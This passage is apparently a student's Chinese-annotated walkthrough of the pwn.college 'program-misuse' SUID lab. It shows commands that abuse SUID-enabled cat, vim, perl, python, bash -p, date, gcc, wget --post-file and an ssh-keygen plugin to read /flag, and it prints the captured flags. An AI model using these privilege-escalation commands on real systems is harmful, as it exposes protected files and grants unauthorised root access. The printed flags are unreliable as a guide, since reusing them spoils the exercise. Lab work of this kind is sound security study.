\u5c31\u884c\u4e86 hacker@program-misuse-level-39:~$ cp /flag /dev/stdout pwn.college{Q2azoEz2fXYLZxYkmGAK4PjtrO7.0VM4EDL2QjMyMzW} hacker@program-misuse-level-39:~$ level40 Lets you get the flag by doing tricks with permissions! hacker@program-misuse-level-40:~$ sh file.sh Welcome to ./babysuid_level40! This challenge is part of a series of programs that let you get the flag by doing tricks with permissions. I just set the SUID bit on /usr/bin/mv. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level40) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/mv! \u8fd9\u9898\uff0c\u5341\u5206\u7684\u79bb\u8c31\u554a\uff0c\u5b8c\u5168\u4e0d\u4f1a\u505a\uff0c\u770b\u7684\u7b54\u6848\uff0c\u5b9e\u5728\u662f\u592a\u9a9a\u6c14\u4e86\uff0c\u4f7f\u7528mv\u628acat\u8986\u76d6mv hacker@program-misuse-level-40:~$ mv /usr/bin/cat /usr/bin/mv hacker@program-misuse-level-40:~$ sh file.sh Welcome to ./babysuid_level40! This challenge is part of a series of programs that let you get the flag by doing tricks with permissions. I just set the SUID bit on /usr/bin/mv. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level40) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/mv! hacker@program-misuse-level-40:~$ mv /flag pwn.college{g9AYY8a5E2v4R8jr_434HNFYEL3.0lM4EDL2QjMyMzW} hacker@program-misuse-level-40:~$ ///@TODO:\u8fd9\u4e2a\u503c\u5f97\u8bb0\u5f55\u4e00\u4e0b\uff01 \u8fd9\u4e2a\u9898\u8ba9\u6211\u60f3\u8d77\u4e86\u4e00\u4e2a\u770b\u5230\u7684\u5185\u5bb9\uff1a \u5982\u679c\u6211\u4eec\u5728\u547d\u4ee4\u4e4b\u4e2d\u4e0d\u4f7f\u7528\u7ba1\u9053\u800c\u4f7f\u7528\u91cd\u5b9a\u5411\uff08\u8fd9\u662f\u65b0\u624b\u53ef\u80fd\u4f1a\u72af\u7684\u9519\u8bef\uff09\u90a3\u4e48\u524d\u4e00\u4e2a\u8f93\u51fa\u4f1a\u91cd\u5199\u5230\u540e\u9762\u7684\u547d\u4ee4\u4e4b\u4e2d\u9020\u6210\u6df7\u4e71\uff0c\u6bd4\u5982 cat /flag > more level41 Lets you read the flag because they let you program anything! hacker@program-misuse-level-41:~$ sh file.sh Welcome to ./babysuid_level41! This challenge is part of a series of programs that let you read the flag because they let you program anything. I just set the SUID bit on /usr/bin/perl. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level41) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/perl! perl \u662f\u4e2a\u811a\u672c\u89e3\u91ca\u5668\uff0c hacker@program-misuse-level-41:~$ perl -ne \"print if pwn.college\" /flag perl: warning: Setting locale failed. perl: warning: Please check that your locale settings: LANGUAGE = (unset), LC_ALL = (unset), LC_CTYPE = \"C.UTF-8\", LANG = \"en_US.UTF-8\" are supported and installed on your system. perl: warning: Falling back to the standard locale (\"C\"). pwn.college{s8g_u7MkHNRfph-Yrrslj2vzKUJ.01M4EDL2QjMyMzW} hacker@program-misuse-level-41:~$ \u6253\u5370\u6709pen.college\u7684\u884c level42 Lets you read the flag because they let you program anything! hacker@program-misuse-level-42:~$ sh file.sh Welcome to ./babysuid_level42! This challenge is part of a series of programs that let you read the flag because they let you program anything. I just set the SUID bit on /usr/bin/python. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level42) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/python! \u4f7f\u7528python >>> with open(\"/flag\",\"r\") as f: ... print(f.read()) ... pwn.college{kTtv9lYtW7yK8dnUSvApk5Yv1s-.0FN4EDL2QjMyMzW} >>> level43 Lets you read the flag because they let you program anything! hacker@program-misuse-level-43:~$ sh file.sh Welcome to ./babysuid_level43! This challenge is part of a series of programs that let you read the flag because they let you program anything. I just set the SUID bit on /usr/bin/ruby. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level43) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/ruby! \u7528ruby\u5199\u811a\u672c # \u6253\u5f00\u6587\u4ef6 File.open('/flag', 'r') do |f| # \u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9 content = f.read # \u8f93\u51fa\u6587\u4ef6\u5185\u5bb9 puts content end hacker@program-misuse-level-43:~$ ruby level43.rb pwn.college{smGb0PfTvxp0__6HgKHsucNW2Pg.0VN4EDL2QjMyMzW} hacker@program-misuse-level-43:~$ level44 Lets you read the flag because they let you program anything! hacker@program-misuse-level-44:~$ sh file.sh Welcome to ./babysuid_level44! This challenge is part of a series of programs that let you read the flag because they let you program anything. I just set the SUID bit on /usr/bin/bash. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level44) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/bash! bash\uff0c\u53c2\u7167\u4e4b\u524d\u7684\u9898\u62ff\u5230\u63d0\u793a\u7b26 hacker@program-misuse-level-44:~$ bash -p bash-5.0# cat /flag pwn.college{wsQ6idwZWBnJ7doJInQhvY0hBVg.0lN4EDL2QjMyMzW} bash-5.0# level45 Just straight up wasn't designed to let you read files! hacker@program-misuse-level-45:~$ sh file.sh Welcome to ./babysuid_level45! This challenge is part of a series of programs that just straight up weren't designed to let you read files. I just set the SUID bit on /usr/bin/date. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level45) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/date! \u624b\u518c\u91cc\u5199\u4e86-f\u8bfb\u6587\u4ef6 hacker@program-misuse-level-45:~$ date -f /flag date: invalid date 'pwn.college{E0wTS_9vWAv5Z6QWVWGpaHKER5P.01N4EDL2QjMyMzW}' hacker@program-misuse-level-45:~$ level46 Just straight up wasn't designed to let you read files! hacker@program-misuse-level-46:~$ sh file.sh Welcome to ./babysuid_level46! This challenge is part of a series of programs that just straight up weren't designed to let you read files. I just set the SUID bit on /usr/bin/dmesg. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level46) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/dmesg! \u663e\u793a\u5f00\u673a\u65f6\u95f4\u4e4b\u7c7b\u7684\u4e1c\u897f hacker@program-misuse-level-46:~$ dmesg -F /flag [ 0.000000] pwn.college{Q8U4rT5_srr0BlLq1ZlDOJx0yDe.0FO4EDL2QjMyMzW} hacker@program-misuse-level-46:~$ \u90fd\u662f\u770b\u624b\u518c level47 Just straight up wasn't designed to let you read files! hacker@program-misuse-level-47:~$ sh file.sh Welcome to ./babysuid_level47! This challenge is part of a series of programs that just straight up weren't designed to let you read files. I just set the SUID bit on /usr/bin/wc. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level47) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/wc! wc \u4e00\u822c\u7528\u4e8e\u7edf\u8ba1\u884c\u53f7\u3001\u5b57\u6570\u4ec0\u4e48\u7684\u3002 hacker@program-misuse-level-47:~$ wc --files0-from=/flag wc: 'pwn.college{shy1dFSZ2LmpPnQ-OAl_RoDeLxh.0VO4EDL2QjMyMzW}'$'\\n': No such file or directory hacker@program-misuse-level-47:~$ \u4ece\u624b\u518c\u6765\u770b\u5c31\u4e0a\u9762\u8fd9\u4e2a\u4e0d\u662f\u7edf\u8ba1\u6570\u91cf\u7684\uff0c\u56e0\u6b64\u5c31\u5b83\u4e86\uff01 level48 Just straight up wasn't designed to let you read files! hacker@program-misuse-level-48:~$ sh file.sh Welcome to ./babysuid_level48! This challenge is part of a series of programs that just straight up weren't designed to let you read files. I just set the SUID bit on /usr/bin/gcc. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level48) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/gcc! \u6709\u70b9\u513f\u610f\u601d\uff0cgcc\u90fd\u51fa\u6765\u4e86 hacker@program-misuse-level-48:~$ gcc -x c -E /flag # 1 \"/flag\" # 1 \"<built-in>\" # 1 \"<command-line>\" # 31 \"<command-line>\" # 1 \"/usr/include/stdc-predef.h\" 1 3 4 # 32 \"<command-line>\" 2 # 1 \"/flag\" pwn.college{UgtHTJRU8raItcJF89PS-hM7Rh9.0FM5EDL2QjMyMzW} hacker@program-misuse-level-48:~$ \u5b83\u8fd9\u4e2a\u5fc5\u987b\u8981\u6307\u5b9a\u8bed\u8a00\uff0c\u4e0d\u7136\u4e0d\u80fd\u8fd0\u884c ///@TODO: \u8fd9\u4e2a\u4e00\u5b9a\u8981\u53bb\u770b\u5b98\u65b9\u89e3\u7b54\uff0c\u76f4\u63a5\u5728\u4e00\u4e2a\u7a0b\u5e8f\u91cc\u9762include '/flag'\uff0c\u7136\u540e\u9760\u62a5\u9519\u5f97\u5230flag\uff0c\u975e\u5e38\u6709\u542f\u53d1 level49 Just straight up wasn't designed to let you read files! hacker@program-misuse-level-49:~$ sh file.sh Welcome to ./babysuid_level49! This challenge is part of a series of programs that just straight up weren't designed to let you read files. I just set the SUID bit on /usr/bin/as. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level49) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/as! as :\u6c47\u7f16\u8bed\u8a00\u7684\u7f16\u8bd1\u5668 hacker@program-misuse-level-49:~$ as -g /flag /flag: Assembler messages: /flag:1: Error: no such instruction: `pwn.college{MqHCh7Oprd3rEP2f1i_RgAl8QZR.0VM5EDL2QjMyMzW}' hacker@program-misuse-level-49:~$ \u901a\u8fc7\u8c03\u8bd5\u8f93\u51fa level50 Just straight up wasn't designed to let you read files! hacker@program-misuse-level-50:~$ sh file.sh Welcome to ./babysuid_level50! This challenge is part of a series of programs that just straight up weren't designed to let you read files. I just set the SUID bit on /usr/bin/wget. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level50) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/wget! wget :\u4e0b\u8f7d\u5668 hacker@program-misuse-level-50:~$ nc -lp 8888 & wget --post-file=/flag http://127.0.0.1:8888 [1] 5873 --2023-07-22 13:39:17-- http://127.0.0.1:8888/ Connecting to 127.0.0.1:8888... connected. POST / HTTP/1.1 User-Agent: Wget/1.20.3 (linux-gnu) Accept: */* Accept-Encoding: identity Host: 127.0.0.1:8888 Connection: Keep-Alive Content-Type: application/x-www-form-urlencoded Content-Length: 57 HTTP request sent, awaiting response... pwn.college{M8oJZxXsT1hCl5_WCWqpA-ITlJZ.0lM5EDL2QjMyMzW} \u6709\u4e2a\u53eb\u6587\u4ef6\u4e0a\u4f20\u7684\u529f\u80fd\uff0c\u8fd9\u4e2a\u770b\u4e86\u4e00\u4e2a\u522b\u4eba\u7684\u7b54\u6848 level51 Shows how dangerous it is to allow users to load their own code as plugins into the program (but figuring out how is the hard part)! hacker@program-misuse-level-51:~$ sh file.sh Welcome to ./babysuid_level51! This challenge is part of a series of programs that show you how dangerous it is to allow users to load their own code as plugins into the program (but figuring out how is the hard part!). I just set the SUID bit on /usr/bin/ssh-keygen. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level51) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/ssh-keygen! \u8fd9\u4e2a\u6211\u662f\u4e00\u70b9\u513f\u90fd\u4e0d\u4f1a\uff0c\u770b\u4e86\u4e00\u4e0b\u8bb2\u89e3\u624d\u660e\u767d\uff0cG \u8fd9\u4e2a\u5c31\u662f\u5199\u4e00\u4e2aC/C++\u7a0b\u5e8f\uff0c\u91cc\u9762\u8981\u6709C_GetFunctionList\u8fd9\u4e2a\u51fd\u6570\uff0c\u7136\u540e\u7528sendfile\u6765open\u6587\u4ef6\u3002 \u7136\u540e\u4f7f\u7528gcc\u7f16\u8bd1\u6210.so\u6587\u4ef6\uff0c\u6700\u540e\u4f7f\u7528ssh-keygen -D\u5373\u53ef\u3002 hacker@program-misuse-level-51:~$ ssh-keygen -D ./level51.so pwn.college{koI1pFWalnNHyjlN_NQ4CLcsasT.01M5EDL2QjMyMzW} C_GetFunctionList for provider ./level51.so failed: 57 cannot read public key from pkcs11 hacker@program-misuse-level-51:~$ \u503c\u5f97\u8bb0\u5f55\u7684\u5185\u5bb9 \u5173\u4e8emv \u90a3\u5757\u513f\u7684\uff0c[\u4e00\u4e2a\u535a\u5ba2]\uff08https://medium.com/workindia-in/the-dark-side-of-mv-command-3419c1bd619\uff09 \u6700\u540e\u4e00\u4e2a\u9898\u7684 \u8bb2\u89e3 ,\u8fd9\u73a9\u610f\u513f\u4e0d\u8bb2\u662f\u771f\u4e0d\u4f1a\uff0c\u592a\u83dc\u4e86","title":"program misuse"},{"location":"CSE466/program-misuse/#knowledge","text":"","title":"knowledge"},{"location":"CSE466/program-misuse/#_1","text":"linux\u3001\u547d\u4ee4\u884c\u3001\u8fdb\u7a0b\u3001\u6587\u4ef6\u7cfb\u7edf\u3001\u76ee\u5f55\u3001\u8f6f\u8fde\u63a5\u548c\u786c\u94fe\u63a5\u3001\u8def\u5f84\uff08\u7edd\u5bf9\u3001\u76f8\u5bf9\uff09\u3001\u7ba1\u9053\u3001\u91cd\u5b9a\u5411","title":"\u57fa\u672c\u77e5\u8bc6"},{"location":"CSE466/program-misuse/#ref","text":"\u5173\u4e8e\u8f6f\u8fde\u63a5\uff0c\u8fd9\u91cc\u6709\u51e0\u4e2a\u4e0d\u9519\u7684\u53c2\u8003 - \u633a\u6e05\u695a\u7684\u8bb2\u89e3 - \u83dc\u9e1f \u7136\u540e\u662f\u6743\u9650\u3001\u63d0\u6743\u7684\u5185\u5bb9 \u8fd9\u91cc\u9700\u8981\u660e\u767d\u6743\u9650\u3001\u7528\u6237\u3001\u7528\u6237\u7ec4\u8fd9\u4e9b\u6982\u5ff5\uff0c\u4ee5\u53ca\u975e\u5e38\u975e\u5e38\u91cd\u8981\u7684uid gid\u7b49\u5185\u5bb9 SUID: execute with the eUID of the file owner rather than the parent process. SGID: execute with the eGID of the file owner rather than the parent process. Sticky: used for shared directories to limit file removal to file owners. Three different type of user and group IDs: Effective (eUID, eGID): the UID/GID used for most access checks. Real (UID, GID): the \"real\" UID (or GID) of the process owner, used for things such as signal checks. Saved: a UID/GID that your process could switch its eUID/eGID to. Used for temporarily dropping privileges.","title":"ref"},{"location":"CSE466/program-misuse/#ref_1","text":"\u4e00\u4e2a\u535a\u5ba2 \u8fd9\u4e2a\u535a\u5ba2\u7684\u98ce\u683c\u6211\u5f88\u559c\u6b22\uff0c\u54ea\u5929\u5077\u8fc7\u6765","title":"ref"},{"location":"CSE466/program-misuse/#challenges","text":"","title":"challenges"},{"location":"CSE466/program-misuse/#useful-shell","text":"#!/bin/bash # \u8fdb\u5165/challenge\u76ee\u5f55 cd /challenge # \u83b7\u53d6\u8be5\u76ee\u5f55\u4e0b\u552f\u4e00\u7684\u6587\u4ef6\u540d filename=$(ls) # \u6267\u884c\u8be5\u6587\u4ef6 ./$filename then sh filename.sh","title":"useful shell"},{"location":"CSE466/program-misuse/#level1-lets-you-directly-read-the-flag","text":"hacker@program-misuse-level-1:/challenge$ ./babysuid_level1 Welcome to ./babysuid_level1! This challenge is part of a series of programs that exposes you to very simple programs that let you directly read the flag. I just set the SUID bit on /usr/bin/cat. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level1) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/cat! hacker@program-misuse-level-1:/challenge$ \u5df2\u7ecf\u7ed9\u6211uid\u4e86\uff0c\u7136\u540e\u6211\u76f4\u63a5\u8bfb\u53d6\u5373\u53ef hacker@program-misuse-level-1:/$ ls bin boot challenge dev etc flag home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var hacker@program-misuse-level-1:/$ cat flag pwn.college{gtmGRqQdewLiKKwB2Wi1NeBxX3w.01M0EDL2QjMyMzW} hacker@program-misuse-level-1:/$","title":"level1 Lets you directly read the flag!"},{"location":"CSE466/program-misuse/#level2-lets-you-directly-read-the-flag","text":"hacker@program-misuse-level-2:/challenge$ ./babysuid_level2 Welcome to ./babysuid_level2! This challenge is part of a series of programs that exposes you to very simple programs that let you directly read the flag. I just set the SUID bit on /usr/bin/more. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level2) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/more! hacker@program-misuse-level-2:/challenge$ \u8fd9\u4e2a\u662f\u7528 more \u8bfb\u53d6 hacker@program-misuse-level-2:/challenge$ more /flag pwn.college{g0orxg7_IfgidrE5G2scOM8wdRx.0FN0EDL2QjMyMzW} hacker@program-misuse-level-2:/challenge$","title":"level2 Lets you directly read the flag!"},{"location":"CSE466/program-misuse/#level3-lets-you-directly-read-the-flag","text":"hacker@program-misuse-level-3:/challenge$ ./babysuid_level3 Welcome to ./babysuid_level3! This challenge is part of a series of programs that exposes you to very simple programs that let you directly read the flag. I just set the SUID bit on /usr/bin/less. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level3) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/less! hacker@program-misuse-level-3:/challenge$ \u8fd9\u6b21\u662f\u7528 less hacker@program-misuse-level-3:/challenge$ less /flag pwn.college{onJWxeGXCk8o-LqXlLemr-Xzk2W.0VN0EDL2QjMyMzW} /flag (END) less\u6bd4more\u597d\u7528\uff0c\u8bb0\u5f97\u4f7f\u7528q\u9000\u51fa","title":"level3 Lets you directly read the flag!"},{"location":"CSE466/program-misuse/#level4-lets-you-directly-read-the-flag","text":"hacker@program-misuse-level-4:/challenge$ ./babysuid_level4 Welcome to ./babysuid_level4! This challenge is part of a series of programs that exposes you to very simple programs that let you directly read the flag. I just set the SUID bit on /usr/bin/tail. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level4) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/tail! hacker@program-misuse-level-4:/challenge$ \u7528 tail hacker@program-misuse-level-4:/challenge$ tail /flag pwn.college{8A8n6zzy-sUTn179ZADopx1lzFV.0lN0EDL2QjMyMzW} hacker@program-misuse-level-4:/challenge$ \u6211\u73b0\u5728\u731c\u4e0b\u4e00\u4e2a\u7528head","title":"level4 Lets you directly read the flag!"},{"location":"CSE466/program-misuse/#level5-lets-you-directly-read-the-flag","text":"hacker@program-misuse-level-5:~$ sh file.sh Welcome to ./babysuid_level5! This challenge is part of a series of programs that exposes you to very simple programs that let you directly read the flag. I just set the SUID bit on /usr/bin/head. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level5) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/head! hacker@program-misuse-level-5:~$ \u679c\u7136\u7528head hacker@program-misuse-level-5:~$ head /flag pwn.college{wVl3wFV0tMkY6rAFaMWKvEoOt2R.01N0EDL2QjMyMzW} hacker@program-misuse-level-5:~$","title":"level5 Lets you directly read the flag!"},{"location":"CSE466/program-misuse/#level6-lets-you-directly-read-the-flag","text":"hacker@program-misuse-level-6:~$ sh file.sh Welcome to ./babysuid_level6! This challenge is part of a series of programs that exposes you to very simple programs that let you directly read the flag. I just set the SUID bit on /usr/bin/sort. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level6) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/sort! hacker@program-misuse-level-6:~$ sort /flag pwn.college{wRB7HgX_kvB4Uro33D7t1UKWZcE.0FO0EDL2QjMyMzW} hacker@program-misuse-level-6:~$ \u8fd9\u6b21\u5c45\u7136\u662f\u7528sort \u8fd9\u91cc\u505a\u4e00\u4e2a\u5c0f\u603b\u7ed3\uff0c\u4ee5\u4e0a\u8fd9\u51e0\u4e2a\u5de5\u5177\u90fd\u975e\u5e38\u5e38\u7528\uff0c\u800c\u4e14\u7ecf\u5e38\u662f\u7ec4\u5408\u4f7f\u7528\u7684\uff0c\u5efa\u8bae\u4f7f\u7528 man \u9605\u8bfb\u624b\u518c\uff0c\u7136\u540e\u591a\u5c1d\u8bd5\u642d\u914d\u4f7f\u7528\u3002","title":"level6 Lets you directly read the flag!"},{"location":"CSE466/program-misuse/#level7-shows-you-that-an-over-privileged-editor-is-a-very-powerful-tool","text":"hacker@program-misuse-level-7:~$ sh file.sh Welcome to ./babysuid_level7! This challenge is part of a series of programs that shows you that an over-privileged editor is a very powerful tool, indeed. I just set the SUID bit on /usr/bin/vim. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level7) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/vim! hacker@program-misuse-level-7:~$ vim /flag \u4ece\u6807\u9898\u80fd\u770b\u51fa\u6765\u662f\u7528\u67d0\u79cd\u7f16\u8f91\u5de5\u5177\uff0c\u8fd9\u6b21\u662f vim pwn.college{YA-02bwpz2aH0bVuFckXnVUE_a8.0VO0EDL2QjMyMzW} \u6211\u731c\u540e\u8fb9\u513f\u5f97\u6709nano emacs\u7b49\u7b49","title":"level7 Shows you that an over-privileged editor is a very powerful tool!"},{"location":"CSE466/program-misuse/#level8-shows-you-that-an-over-privileged-editor-is-a-very-powerful-tool","text":"hacker@program-misuse-level-8:~$ sh file.sh Welcome to ./babysuid_level8! This challenge is part of a series of programs that shows you that an over-privileged editor is a very powerful tool, indeed. I just set the SUID bit on /usr/bin/emacs. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level8) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/emacs! \u679c\u7136\u4e0d\u51fa\u6211\u6240\u6599hhh pwn.college{sCKRHf2_yRVb3Q_MEPjyLzcoqdN.0FM1EDL2QjMyMzW} emacs\u4e5f\u662f\u4e00\u4e2a\u5f3a\u5927\u7684\u5de5\u5177\uff0c\u53ef\u4ee5\u5b66\u4e00\u5b66\u3002 \u8fd9\u91cc\u9000\u51fa\u547d\u4ee4\u662f","title":"level8 Shows you that an over-privileged editor is a very powerful tool!"},{"location":"CSE466/program-misuse/#level9-shows-you-that-an-over-privileged-editor-is-a-very-powerful-tool","text":"hacker@program-misuse-level-9:~$ sh file.sh Welcome to ./babysuid_level9! This challenge is part of a series of programs that shows you that an over-privileged editor is a very powerful tool, indeed. I just set the SUID bit on /usr/bin/nano. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level9) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/nano! hacker@program-misuse-level-9:~$ nano /flag \u6211\u679c\u7136\u6599\u4e8b\u5982\u795e pwn.college{w4DHxmYT2HQw-wrXkHpQXqNmIWW.0VM1EDL2QjMyMzW} \u9000\u51fa\u547d\u4ee4\u662f","title":"level9 Shows you that an over-privileged editor is a very powerful tool!"},{"location":"CSE466/program-misuse/#level10-requires-you-to-understand-their-output-to-derive-the-flag-from-it","text":"\u4e00\u53e5\u9898\u5916\u8bdd\uff0c\u4e0d\u540c\u6311\u6218\u4e4b\u95f4\u65e0\u7f1d\u5207\u6362\u597d\u5feb\u554a\uff0c\u5f88\u9002\u5408Linux\u76f4\u63a5\u7528terminal\u94fe\u63a5\uff01 hacker@program-misuse-level-10:~$ sh file.sh Welcome to ./babysuid_level10! This challenge is part of a series of programs that require you to understand their output to derive the flag from it. I just set the SUID bit on /usr/bin/rev. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level10) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/rev! rev \u662f\u53cd\u5e8f\u8f93\u51fa\u7684\u5de5\u5177 \u4f46\u662f\u96be\u4e0d\u4f4f\u6211 hacker@program-misuse-level-10:~$ rev /flag }WzMyMjQ2LDE1Ml0.iqRmReNkY5WaIyBZQULv-MYk7kI{egelloc.nwp hacker@program-misuse-level-10:~$ rev /flag | rev pwn.college{Ik7kYM-vLUQZByIaW5YkNeRmRqi.0lM1EDL2QjMyMzW} hacker@program-misuse-level-10:~$","title":"level10 Requires you to understand their output to derive the flag from it!"},{"location":"CSE466/program-misuse/#level11-requires-you-to-understand-their-output-to-derive-the-flag-from-it","text":"hacker@program-misuse-level-11:~$ sh file.sh Welcome to ./babysuid_level11! This challenge is part of a series of programs that require you to understand their output to derive the flag from it. I just set the SUID bit on /usr/bin/od. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level11) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/od! od \u901a\u5e38\u7528\u4e8e\u4ee5\u516b\u8fdb\u5236\u6216\u5341\u516d\u8fdb\u5236\u683c\u5f0f\u663e\u793a\u6587\u4ef6\u7684\u5185\u5bb9\u3002 hacker@program-misuse-level-11:~$ od -A x -t x1z -v /flag 000000 70 77 6e 2e 63 6f 6c 6c 65 67 65 7b 73 4b 47 35 >pwn.college{sKG5< 000010 6d 6b 70 75 44 35 38 63 71 76 44 65 33 32 39 4e >mkpuD58cqvDe329N< 000020 57 6c 4f 36 31 41 39 2e 30 31 4d 31 45 44 4c 32 >WlO61A9.01M1EDL2< 000030 51 6a 4d 79 4d 7a 57 7d 0a >QjMyMzW}.< 000039 hacker@program-misuse-level-11:~$ \u770b\u4e86\u6587\u6863\u5c31\u4f1a\u4e86\uff0c\u8fd9\u4e2a\u547d\u4ee4\u76f4\u63a5\u5199\u5728\u6587\u6863\u91cc\u3002 pwn.college{sKG5mkpuD58cqvDe329NWlO61A9.01M1EDL2QjMyMzW}","title":"level11 Requires you to understand their output to derive the flag from it!"},{"location":"CSE466/program-misuse/#level12-requires-you-to-understand-their-output-to-derive-the-flag-from-it","text":"Welcome to ./babysuid_level12! This challenge is part of a series of programs that require you to understand their output to derive the flag from it. I just set the SUID bit on /usr/bin/hd. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level12) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/hd! \u5947\u602a\u7684 hd \u5de5\u5177\uff0c\u5341\u516d\u8fdb\u5236\u7684\u3002 hacker@program-misuse-level-12:~$ hd /flag 00000000 70 77 6e 2e 63 6f 6c 6c 65 67 65 7b 6f 47 7a 69 |pwn.college{oGzi| 00000010 37 55 30 32 58 54 6c 5f 64 73 6e 50 43 77 73 42 |7U02XTl_dsnPCwsB| 00000020 52 38 6d 59 54 77 6d 2e 30 46 4e 31 45 44 4c 32 |R8mYTwm.0FN1EDL2| 00000030 51 6a 4d 79 4d 7a 57 7d 0a |QjMyMzW}.| 00000039 hacker@program-misuse-level-12:~$ man hd \u8fd9\u91cc\u5df2\u7ecf\u53ef\u4ee5\u76f4\u63a5\u590d\u5236\u4e86\uff0c\u4f46\u662f\u5e0c\u671b\u6709\u66f4\u7b80\u4fbf\u7684\u5f62\u52bf\uff0c\u53bb\u770b\u4e86\u6587\u6863\uff0c\u4f46\u662f\u6ca1\u592a\u7814\u7a76\u660e\u767d\uff0c\u778e\u6574\u4e86\u4e00\u4e2a\u8f93\u51fa hacker@program-misuse-level-12:~$ hd -f /flag hd: \"pwn.college{oGzi7U02XTl_dsnPCwsBR8mYTwm.0FN1EDL2QjMyMzW}\": bad format hacker@program-misuse-level-12:~$","title":"level12 Requires you to understand their output to derive the flag from it!"},{"location":"CSE466/program-misuse/#level13-requires-you-to-understand-their-output-to-derive-the-flag-from-it","text":"Welcome to ./babysuid_level13! This challenge is part of a series of programs that require you to understand their output to derive the flag from it. I just set the SUID bit on /usr/bin/xxd. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level13) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/xxd! xxd \uff0c\u662f\u4e2a\u4e8c\u8fdb\u5236\u7684\u5de5\u5177\u3002\u8fd9\u4e2a\u6211\u4f1a hacker@program-misuse-level-13:~$ xxd /flag 00000000: 7077 6e2e 636f 6c6c 6567 657b 4d56 2d59 pwn.college{MV-Y 00000010: 6e5f 3465 4777 6c63 6f49 5438 4a63 574a n_4eGwlcoIT8JcWJ 00000020: 6934 7764 2d53 692e 3056 4e31 4544 4c32 i4wd-Si.0VN1EDL2 00000030: 516a 4d79 4d7a 577d 0a QjMyMzW}. \u7136\u540e\u624b\u52a8\u590d\u5236... pwn.college{MV-Yn_4eGwlcoIT8JcWJi4wd-Si.0VN1EDL2QjMyMzW}","title":"level13 Requires you to understand their output to derive the flag from it!"},{"location":"CSE466/program-misuse/#level14-requires-you-to-understand-their-output-to-derive-the-flag-from-it","text":"hacker@program-misuse-level-14:~$ sh file.sh Welcome to ./babysuid_level14! This challenge is part of a series of programs that require you to understand their output to derive the flag from it. I just set the SUID bit on /usr/bin/base32. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level14) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/base32! base32 \u90fd\u51fa\u6765\u4e86,\u5c31\u4e00\u4e2a\u53c2\u6570 -d hacker@program-misuse-level-14:~$ base32 /flag OB3W4LTDN5WGYZLHMV5UCT3NM4ZWGTLYK5YV6SCVOR2XC5CSMF4WM6LML5UWE4ZOGBWE4MKFIRGD EULKJV4U26SXPUFA==== hacker@program-misuse-level-14:~$ base32 /flag | base32 -d pwn.college{AOmg3cMxWq_HUtuqtRayfyl_ibs.0lN1EDL2QjMyMzW} hacker@program-misuse-level-14:~$ \u90a3\u6211\u731c\u4e0b\u4e00\u4e2a\u662fbase64","title":"level14 Requires you to understand their output to derive the flag from it!"},{"location":"CSE466/program-misuse/#level15-requires-you-to-understand-their-output-to-derive-the-flag-from-it","text":"hacker@program-misuse-level-15:~$ sh file.sh Welcome to ./babysuid_level15! This challenge is part of a series of programs that require you to understand their output to derive the flag from it. I just set the SUID bit on /usr/bin/base64. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level15) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/base64! hacker@program-misuse-level-15:~$ \u563f\u563f\uff0c\u679c\u7136 hacker@program-misuse-level-15:~$ base64 /flag | base64 -d 